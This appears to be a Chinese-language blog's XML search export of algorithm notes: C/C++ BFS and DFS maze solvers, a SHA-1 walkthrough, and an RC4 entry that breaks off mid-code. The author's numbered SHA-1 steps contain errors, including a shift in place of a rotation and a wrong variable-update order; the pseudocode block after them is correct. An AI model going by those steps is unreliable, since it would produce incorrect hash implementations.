class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[N][N]; <span class="comment">// 迷宫</span></span><br><span class="line"><span class="type">int</span> d[N][N]; <span class="comment">// 到起点的距离</span></span><br><span class="line"><span class="type">bool</span> st[N][N]; <span class="comment">// 标记是否已经走过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 四个方向</span></span><br><span class="line"><span class="type">int</span> dx[] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BFS模板</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    queue&lt;Point&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    st[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    d[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果到达终点，返回距离</span></span><br><span class="line">        <span class="keyword">if</span> (t.x == n - <span class="number">1</span> &amp;&amp; t.y == m - <span class="number">1</span>) <span class="keyword">return</span> d[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 四个方向</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a = t.x + dx[i], b = t.y + dy[i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断是否越界或者障碍物</span></span><br><span class="line">            <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; n &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; m &amp;&amp; g[a][b] == <span class="number">0</span> &amp;&amp; !st[a][b]) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;a, b&#125;);</span><br><span class="line">                st[a][b] = <span class="literal">true</span>;</span><br><span class="line">                d[a][b] = d[t.x][t.y] + <span class="number">1</span>; <span class="comment">// 到起点的距离加一</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 如果无法到达终点，返回-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            cin &gt;&gt; g[i][j];</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="built_in">bfs</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SHA1</title>
      <link href="/2023/04/01/SHA1/"/>
      <url>/2023/04/01/SHA1/</url>
      
        <content type="html"><![CDATA[<h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><p>安全哈希算法（Secure Hash Algorithm）主要适用于数字签名标准（Digital Signature Standard DSS）<br> 里面定义的数字签名算法（Digital Signature Algorithm DSA）。</p><p>该算法输入报文的长度不限，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。</p><p> 算法：<br> 1.数据末尾填充0x80<br> 39 31 31 4d 61 6f 48 61 69      “911MaoHai”<br> 39 31 31 4d 61 6f 48 61 69 80<br> 9 * 8 &#x3D; 72   2.计算原始数据的长度<br> 72 &#x3D; 0x00 00 00 00 00000048<br> 39 31 31 4d 61 6f 48 61 69 80 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 48 大端序的数据长度<br> 3.用零填充直到数据的字节数是64的倍数为止<br> 4.把数据进行分组一组为64(512位)个字节 进行计算最终获得一个20个字节的SHA1码<br> 5.初始化五个值 小端序<br> A &#x3D; 0x67452301;<br> B &#x3D; 0xEFCDAB89;<br> C &#x3D; 0x98BADCFE;<br> D &#x3D; 0x10325476;<br> E &#x3D; 0xC3D2E1F0;<br> 6.将我们分好的64个字节扩充为320个字节 4个字节为一组循环80次<br> 7.进行组一数据的计算<br> 定义临时变量并赋值<br> a &#x3D; A; b &#x3D; B; c &#x3D; C; d &#x3D; D; e &#x3D; E<br> 8.计算e的值<br> e &#x3D; (a &lt;&lt; 5)+ f + e + k + w[i];<br> 9.计算b的值<br> b &#x3D; b&lt;&lt;30<br> 10.交换数据<br> b &#x3D; a<br> c &#x3D; b<br> d &#x3D; c<br> e &#x3D; d<br> a &#x3D; e<br> 循环8.9.10三个步骤80次<br> 11.计算<br> A &#x3D; A + a;B &#x3D; B + b;C &#x3D; C + c;D &#x3D; D + d;E &#x3D; E + e<br> 10.跟新7.中a，b，c，d，e计算组二数据<br> 当完成最后一组数据的计算获得 A；B；C；D；E以da端序组合获得最终20个字节(160Bits)就是SHA1码<br> 如：A1A2A3A4 B1B2B3B4 C1C2C3C4 D1D2D3D4 E1E2E3E4<br> A1A2A3A4B1B2B3B4C1C2C3C4D1D2D3D4E1E2E3E4<br> 数据扩充到320个字节<br> 将源数据的64个字节直接赋值到新的空间中<br> 取出当前位置的前面第三个4字节 ^ 取出当前位置的前面第八个4字节 ^ 取出当前位置的前面第十四个4字节 ^ 取出当前位置的前面第十六个4字节<br> 循环左移一位 结果大端序存储<br> 共循环64次<br> 39 31 31 4d 61 6f 48 61 69 80 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 48<br> 75 5A DF A0            —-后面的256个字节需要填充<br> 00 00 00 00 ^ 00 00 00 00 ^ 00 00 00 00 ^ 61 69 80 00  &lt;&lt; 1 &#x3D; 75 5A DF A0<br> 共循环80次<br> f、k的计算<br> 0-19<br> f &#x3D; d^(b&amp;(c^d))<br> k &#x3D; 0x5A827999<br> 20-39<br> f &#x3D; b^c^d<br> k &#x3D; 0x6ED9EBA1<br> 40-59<br> f &#x3D; (b&amp;c)|(b&amp;d)|(c&amp;d)<br> k &#x3D; 0x8F1BBCDC<br> 60-79<br> f &#x3D; b^c^d<br> k &#x3D; 0xCA62C1D6<br> 共循环80次<br> w[i]的计算<br> 数据扩充后的第i个4个字节整型 大端序取出<br> 第一次<br> 39 31 31 4d<br> 第二次<br> 4d 61 6f 48</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Note: All variables are unsigned 32 bits and wrap modulo 232 when calculating</span><br><span class="line">Initial variables:</span><br><span class="line">h0 := 0x67452301</span><br><span class="line">h1 := 0xEFCDAB89</span><br><span class="line">h2 := 0x98BADCFE</span><br><span class="line">h3 := 0x10325476</span><br><span class="line">h4 := 0xC3D2E1F0</span><br><span class="line">Pre-processing:</span><br><span class="line">append the bit &#x27;1&#x27; to the message</span><br><span class="line">append k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message</span><br><span class="line">    length (in bits) is congruent to 448(mod 512)</span><br><span class="line">append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span><br><span class="line">Process the message in successive 512-bit chunks:</span><br><span class="line">break message into 512-bit chunks</span><br><span class="line">for each chunk</span><br><span class="line">    break chunk into sixteen 32-bit big-endian words w[i], 0 ≤ i ≤ 15</span><br><span class="line">    Extend the sixteen 32-bit words into eighty 32-bit words:</span><br><span class="line">    for i from 16 to 79</span><br><span class="line">        w[i] := (w[i-3] xor w[i-8] xor w[i-14] xor w[i-16]) leftrotate 1</span><br><span class="line">    Initialize hash value for this chunk:</span><br><span class="line">    a := h0</span><br><span class="line">    b := h1</span><br><span class="line">    c := h2</span><br><span class="line">    d := h3</span><br><span class="line">    e := h4</span><br><span class="line">    Main loop:</span><br><span class="line">    for i from 0 to 79</span><br><span class="line">        if 0 ≤ i ≤ 19 then</span><br><span class="line">            f := (b and c) or ((not b) and d)</span><br><span class="line">            k := 0x5A827999</span><br><span class="line">        else if 20 ≤ i ≤ 39</span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            k := 0x6ED9EBA1</span><br><span class="line">        else if 40 ≤ i ≤ 59</span><br><span class="line">            f := (b and c) or (b and d) or(c and d)</span><br><span class="line">            k := 0x8F1BBCDC</span><br><span class="line">        else if 60 ≤ i ≤ 79</span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            k := 0xCA62C1D6</span><br><span class="line">        temp := (a leftrotate 5) + f + e + k + w[i]</span><br><span class="line">        e := d</span><br><span class="line">        d := c</span><br><span class="line">        c := b leftrotate 30</span><br><span class="line">        b := a</span><br><span class="line">        a := temp</span><br><span class="line">    Add this chunk&#x27;s hash to result so far:</span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b</span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">    h4 := h4 + e</span><br><span class="line">Produce the final hash value (big-endian):</span><br><span class="line">digest = hash = h0 append h1 append h2 append h3 append h4</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DFS</title>
      <link href="/2023/04/01/DFS/"/>
      <url>/2023/04/01/DFS/</url>
      
        <content type="html"><![CDATA[<h1 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h1><h2 id="一-深度优先搜索（dfs）"><a href="#一-深度优先搜索（dfs）" class="headerlink" title="一.深度优先搜索（dfs）"></a>一.深度优先搜索（dfs）</h2><h3 id="1-什么叫dfs"><a href="#1-什么叫dfs" class="headerlink" title="1.什么叫dfs"></a>1.什么叫dfs</h3><p>深度优先搜索类似于树的先序遍历；</p><p>是利用栈或者递归的方式实现的，体现出了后进先出的特点；</p><p>通俗来说就是一次访问一条路，一直朝着一个方向探索，直到遇到死路退回到前一个分支，继续探索；</p><p>一般来说，深度搜索解决的问题主要为寻求所有解和连通性。</p><h3 id="2-遍历过程"><a href="#2-遍历过程" class="headerlink" title="2.遍历过程"></a>2.遍历过程</h3><p>（1）从图中某个初始顶点v出发，首先访问初始顶点v。</p><p>（2）然后依次从v的未被访问的邻接点w，再从w出发进行深度优先遍历，直到图中所有与v有路径相通的的顶点都被访问过为止。</p><h3 id="3-算法设计"><a href="#3-算法设计" class="headerlink" title="3.算法设计"></a>3.算法设计</h3><p>解决问题:<br>（1）如何确定一个顶点是否访问过？</p><p>设置一个visited[]全局数组，</p><p>visited[i]&#x3D;0表示顶点i没有访问;</p><p>visited[i]&#x3D;1表示顶点i已经访问过。</p><p>（在图中也可以修改图本身来实现）</p><h3 id="4-dfs算法模板"><a href="#4-dfs算法模板" class="headerlink" title="4.dfs算法模板"></a>4.dfs算法模板</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(找到解了)</span><br><span class="line">&#123;</span><br><span class="line">相应的操作；</span><br><span class="line"><span class="keyword">return</span> ；</span><br><span class="line">&#125;</span><br><span class="line">尝试每一种可能</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(满足条件)</span><br><span class="line">&#123;</span><br><span class="line">标记走过；</span><br><span class="line">进行下一步dfs；</span><br><span class="line">回溯一步；<span class="comment">//恢复原状态</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ol><li><h3 id="最短路径（迷宫问题）"><a href="#最短路径（迷宫问题）" class="headerlink" title="最短路径（迷宫问题）"></a>最短路径（迷宫问题）</h3></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用dfs来计算最短路径</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> r,c,num=<span class="number">10000</span>;</span><br><span class="line"><span class="type">char</span> map[<span class="number">41</span>][<span class="number">41</span>];</span><br><span class="line"><span class="type">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==r&amp;&amp;y==c)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(num&gt;k)</span><br><span class="line">&#123;</span><br><span class="line">num=k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> nx=x+dx[i];</span><br><span class="line"><span class="type">int</span> ny=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&gt;=<span class="number">1</span>&amp;&amp;nx&lt;=c&amp;&amp;ny&gt;=<span class="number">1</span>&amp;&amp;ny&lt;=r&amp;&amp;map[ny][nx]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">map[ny][nx]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="built_in">dfs</span>(nx,ny,k+<span class="number">1</span>);</span><br><span class="line">map[ny][nx]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;r,&amp;c);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=r;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=c;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>,&amp;map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">map[<span class="number">1</span>][<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-路径判断"><a href="#2-路径判断" class="headerlink" title="2. 路径判断"></a>2. 路径判断</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dfs遍历是否能够从(ha,la)到(hb,lb)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> n,ha,la,hb,lb,nx,ny;</span><br><span class="line"><span class="type">bool</span> flag;</span><br><span class="line"><span class="type">char</span> map[<span class="number">200</span>][<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">nx=x+dx[i];</span><br><span class="line">ny=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&gt;=<span class="number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="number">0</span>&amp;&amp;ny&lt;n&amp;&amp;map[nx][ny]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">map[nx][ny]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(nx==hb&amp;&amp;ny==lb)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">flag=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">dfs</span>(nx,ny);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag=<span class="literal">false</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">memset</span>(map,<span class="string">&#x27;#&#x27;</span>,<span class="built_in">sizeof</span>(map));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> h=<span class="number">0</span>;h&lt;n;h++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>,&amp;map[j][h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;ha,&amp;la,&amp;hb,&amp;lb);</span><br><span class="line"><span class="keyword">if</span>(map[ha][la]==<span class="string">&#x27;#&#x27;</span>||map[hb][lb]==<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">map[ha][la]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="comment">//标记起点走过</span></span><br><span class="line"><span class="built_in">dfs</span>(ha,la);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2023/04/01/RC4/"/>
      <url>/2023/04/01/RC4/</url>
      
        <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><h2 id="什么是RC4"><a href="#什么是RC4" class="headerlink" title="什么是RC4 ?"></a>什么是RC4 ?</h2><p> RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ron Rivest在1987年设计的密钥长度可变的流加密算法簇，之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。</p><p> 在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。所谓对称加密，就是加密和解密的过程是一样的。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。</p><p> RC4已经成为一些常用的协议和标准的一部分，如1997年的WEP和2003&#x2F;2004年无线卡的WPA; 和1995年的SSL，以及后来1999年的TLS。让它如此广泛分布和使用的主要因素是它不可思议的简单和速度，不管是软件还是硬件，实现起来都十分容易。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>对明文使用同一个密钥异或两次最后得到的是原文</p><ul><li>加密：原文和Keystream进行异或得到密文</li><li>解密：密文和Keystream进行异或得到原文</li></ul><p><img src="/.io//1344097-20210115113816217-826912812.png" alt="img"></p><h2 id="流程图解"><a href="#流程图解" class="headerlink" title="流程图解"></a>流程图解</h2><p><img src="/.io//1344097-20210115113902945-1226971045.png" alt="img"></p><h2 id="生成秘钥流（KeyStream）"><a href="#生成秘钥流（KeyStream）" class="headerlink" title="生成秘钥流（KeyStream）"></a>生成秘钥流（KeyStream）</h2><p>从上图可以看出来，RC4加密原理很简单，只需要一个KeyStream与明文进行异或即可，密钥流的长度和明文的长度是对应的。RC4算法的的主要代码还是在于如何生成秘钥流。</p><p>密钥流的生成由两部分组成：</p><ol><li>KSA（the Key-Scheduling Algorithm)</li><li>PRGA(the Pseudo-Random Generation Algorithm)</li></ol><h3 id="利用Key生成S盒——The-key-scheduling-algorithm-KSA"><a href="#利用Key生成S盒——The-key-scheduling-algorithm-KSA" class="headerlink" title="利用Key生成S盒——The key-scheduling algorithm (KSA)"></a>利用Key生成S盒——The key-scheduling algorithm (KSA)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 得到S-box */</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    S[i] = i;</span><br><span class="line">    T[i] = puc_key[i % key_length];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">    swap_uchar(&amp;S[i], &amp;S[j]); <span class="comment">//交换S[i]和S[j]</span></span><br><span 